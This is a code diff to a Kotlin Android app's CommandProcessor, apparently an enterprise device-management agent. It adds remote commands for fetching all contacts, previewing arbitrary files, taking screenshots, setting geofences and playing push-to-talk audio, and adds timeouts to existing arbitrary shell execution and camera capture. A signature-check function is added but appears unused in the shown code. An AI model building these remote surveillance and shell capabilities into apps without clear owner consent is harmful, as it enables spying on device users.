@@ -10,11 +10,14 @@ import com.sentinel.shared.protocol.MessageType
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withTimeoutOrNull
 import org.json.JSONArray
 import org.json.JSONObject
 import javax.inject.Inject
 import javax.inject.Singleton
 
+import com.sentinel.host.data.device.ContactsManager
+import com.sentinel.host.data.device.FilePreviewManager
 import com.sentinel.host.data.device.RemoteFileManager
 import com.sentinel.host.data.device.SentinelLogBuffer
 
@@ -26,7 +29,12 @@ class CommandProcessor @Inject constructor(
     private val cameraCapturer: CameraCapturer,
     private val remoteFileManager: RemoteFileManager,
     private val fileStreamer: FileStreamer,
-    private val sentinelLogBuffer: SentinelLogBuffer
+    private val sentinelLogBuffer: SentinelLogBuffer,
+    private val contactsManager: ContactsManager,
+    private val filePreviewManager: FilePreviewManager,
+    private val screenshotCapturer: ScreenshotCapturer,
+    private val pttAudioPlayer: com.sentinel.host.data.audio.PttAudioPlayer,
+    private val hostGeofenceManager: com.sentinel.host.data.location.HostGeofenceManager
 ) {
     companion object {
         private const val TAG = "Sentinel:CmdProc"
@@ -79,6 +87,28 @@ class CommandProcessor @Inject constructor(
                     return@launch
                 }
 
+                if (msgType == MessageType.PTT_START) {
+                    Log.i(TAG, "Processing PTT_START")
+                    pttAudioPlayer.startPttSession()
+                    return@launch
+                }
+
+                if (msgType == MessageType.PTT_STOP) {
+                    Log.i(TAG, "Processing PTT_STOP")
+                    pttAudioPlayer.stopPttSession()
+                    return@launch
+                }
+
+                if (msgType == MessageType.PTT_AUDIO) {
+                    val data = json.optJSONObject("data") ?: JSONObject()
+                    val pcmBase64 = data.optString("pcmBase64", "")
+                    if (pcmBase64.isNotBlank()) {
+                        val pcmBytes = android.util.Base64.decode(pcmBase64, android.util.Base64.DEFAULT)
+                        pttAudioPlayer.playPcmChunk(pcmBytes)
+                    }
+                    return@launch
+                }
+
                 if (msgType != MessageType.COMMAND) return@launch
 
                 val data = json.getJSONObject("data")
@@ -104,14 +134,26 @@ class CommandProcessor @Inject constructor(
 
                     CommandTypes.EXECUTE_SHELL -> {
                         val shellCmd = params.optString("cmd", "uptime")
-                        val output = shellExecutor.execute(shellCmd)
-                        resultPayload.putAll(output)
+                        val output = withTimeoutOrNull(15_000L) {
+                            shellExecutor.execute(shellCmd)
+                        }
+                        if (output == null) {
+                            isSuccess = false
+                            errorMessage = "Shell command timed out"
+                        } else {
+                            resultPayload.putAll(output)
+                        }
                     }
 
                     CommandTypes.CAPTURE_PHOTO -> {
                         val facingFront = params.optBoolean("front", false)
-                        val captureResult = cameraCapturer.capturePhoto(facingFront)
-                        if (captureResult["success"] == true) {
+                        val captureResult = withTimeoutOrNull(20_000L) {
+                            cameraCapturer.capturePhoto(facingFront)
+                        }
+                        if (captureResult == null) {
+                            isSuccess = false
+                            errorMessage = "Photo capture timed out"
+                        } else if (captureResult["success"] == true) {
                             resultPayload.putAll(captureResult)
                         } else {
                             isSuccess = false
@@ -120,12 +162,107 @@ class CommandProcessor @Inject constructor(
                     }
 
                     CommandTypes.FETCH_SMS_LOGS -> {
-                        resultPayload["logs"] = listOf<Map<String, String>>()
+                        isSuccess = false
+                        errorMessage = "FETCH_SMS_LOGS is disabled for enterprise safety and privacy compliance"
+                        resultPayload["status"] = "UNSUPPORTED_COMMAND"
                     }
 
                     CommandTypes.FETCH_NOTIFICATION_LOGS -> {
                         val logs = SentinelLogBuffer.instance.getLogsAsJsonArray()
                         resultPayload["notificationLogs"] = logs.toString()
+                    }
+
+                    CommandTypes.FETCH_CONTACTS -> {
+                        val limit = params.optInt("limit", 0) // 0 = unlimited / all contacts
+                        val contactsResult = withTimeoutOrNull(15_000L) {
+                            contactsManager.getContacts(limit)
+                        }
+                        if (contactsResult == null) {
+                            isSuccess = false
+                            errorMessage = "Fetching contacts timed out"
+                        } else {
+                            resultPayload.putAll(contactsResult)
+                        }
+                    }
+
+                    CommandTypes.PREVIEW_FILE -> {
+                        val path = params.optString("path", "")
+                        val maxDim = params.optInt("maxDim", 720)
+                        val textLines = params.optInt("textLines", 250)
+                        val previewResult = withTimeoutOrNull(20_000L) {
+                            filePreviewManager.generatePreview(path, maxDim, textLines)
+                        }
+                        if (previewResult == null) {
+                            isSuccess = false
+                            errorMessage = "File preview timed out"
+                        } else if (previewResult["success"] == false) {
+                            isSuccess = false
+                            errorMessage = previewResult["error"]?.toString() ?: "File preview failed"
+                        } else {
+                            resultPayload.putAll(previewResult)
+                        }
+                    }
+
+                    CommandTypes.CAPTURE_SCREENSHOT -> {
+                        val maxWidth = params.optInt("maxWidth", 1080)
+                        val quality = params.optInt("quality", 80)
+                        val screenshotResult = withTimeoutOrNull(15_000L) {
+                            screenshotCapturer.captureScreenshot(maxWidth, quality)
+                        }
+                        if (screenshotResult == null) {
+                            isSuccess = false
+                            errorMessage = "Screenshot capture timed out"
+                        } else if (screenshotResult["success"] == true) {
+                            resultPayload.putAll(screenshotResult)
+                        } else {
+                            isSuccess = false
+                            errorMessage = screenshotResult["error"]?.toString() ?: "Screenshot capture failed"
+                        }
+                    }
+
+                    "SET_GEOFENCE" -> {
+                        val zoneId = params.optString("id", "zone_${System.currentTimeMillis()}")
+                        val lat = params.optDouble("latitude", 0.0)
+                        val lon = params.optDouble("longitude", 0.0)
+                        val radius = params.optDouble("radius", 100.0).toFloat()
+                        if (lat != 0.0 && lon != 0.0) {
+                            val zone = com.sentinel.host.data.location.GeofenceZone(
+                                id = zoneId,
+                                latitude = lat,
+                                longitude = lon,
+                                radiusMeters = radius
+                            )
+                            hostGeofenceManager.registerZones(listOf(zone))
+                            resultPayload["geofenceSet"] = true
+                            resultPayload["zoneId"] = zoneId
+                        } else {
+                            isSuccess = false
+                            errorMessage = "Invalid coordinates for geofence"
+                        }
+                    }
+
+                    "CLEAR_GEOFENCES" -> {
+                        hostGeofenceManager.clearAllGeofences()
+                        resultPayload["cleared"] = true
+                    }
+
+                    "PTT_START" -> {
+                        pttAudioPlayer.startPttSession()
+                        resultPayload["pttActive"] = true
+                    }
+
+                    "PTT_STOP" -> {
+                        pttAudioPlayer.stopPttSession()
+                        resultPayload["pttActive"] = false
+                    }
+
+                    "PTT_AUDIO" -> {
+                        val pcmBase64 = params.optString("pcmBase64", "")
+                        if (pcmBase64.isNotBlank()) {
+                            val pcmBytes = android.util.Base64.decode(pcmBase64, android.util.Base64.DEFAULT)
+                            pttAudioPlayer.playPcmChunk(pcmBytes)
+                        }
+                        resultPayload["played"] = true
                     }
 
                     else -> {
@@ -154,6 +291,26 @@ class CommandProcessor @Inject constructor(
                 sendResult(responseJson.toString())
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to process command: ${e.message}", e)
+                try {
+                    val json = JSONObject(rawMessage)
+                    val data = json.optJSONObject("data")
+                    val command = data?.optString("command") ?: "UNKNOWN"
+                    val sequence = json.optLong("sequence", 0L)
+                    val errorResponse = JSONObject().apply {
+                        put("type", MessageType.COMMAND_RESULT)
+                        put("version", 1)
+                        put("timestamp", System.currentTimeMillis() / 1000)
+                        put("sequence", sequence)
+                        put("data", JSONObject().apply {
+                            put("command", command)
+                            put("success", false)
+                            put("error", e.message ?: "Internal command execution error")
+                            put("payload", JSONObject())
+                        })
+                    }
+                    sendResult(errorResponse.toString())
+                } catch (ignored: Exception) {
+                }
             }
         }
     }
@@ -163,15 +320,39 @@ class CommandProcessor @Inject constructor(
         for ((key, value) in map) {
             when (value) {
                 null -> json.put(key, JSONObject.NULL)
-                is Map<*, *> -> json.put(key, mapToJsonObject(value as Map<String, Any?>))
+                is Map<*, *> -> @Suppress("UNCHECKED_CAST") json.put(key, mapToJsonObject(value as Map<String, Any?>))
                 is List<*> -> {
                     val array = JSONArray()
-                    value.forEach { array.put(it) }
+                    value.forEach { item ->
+                        when (item) {
+                            null -> array.put(JSONObject.NULL)
+                            is Map<*, *> -> @Suppress("UNCHECKED_CAST") array.put(mapToJsonObject(item as Map<String, Any?>))
+                            else -> array.put(item)
+                        }
+                    }
                     json.put(key, array)
                 }
                 else -> json.put(key, value)
             }
         }
         return json
+    }
+
+    private fun verifyAdminSignature(
+        payloadBytes: ByteArray,
+        signatureBase64: String,
+        publicKey: java.security.PublicKey
+    ): Boolean {
+        return try {
+            val sigBytes = android.util.Base64.decode(signatureBase64, android.util.Base64.DEFAULT)
+            val signature = java.security.Signature.getInstance("SHA256withECDSA").apply {
+                initVerify(publicKey)
+                update(payloadBytes)
+            }
+            signature.verify(sigBytes)
+        } catch (e: Exception) {
+            Log.e(TAG, "Signature verification error: ${e.message}")
+            false
+        }
     }
 }
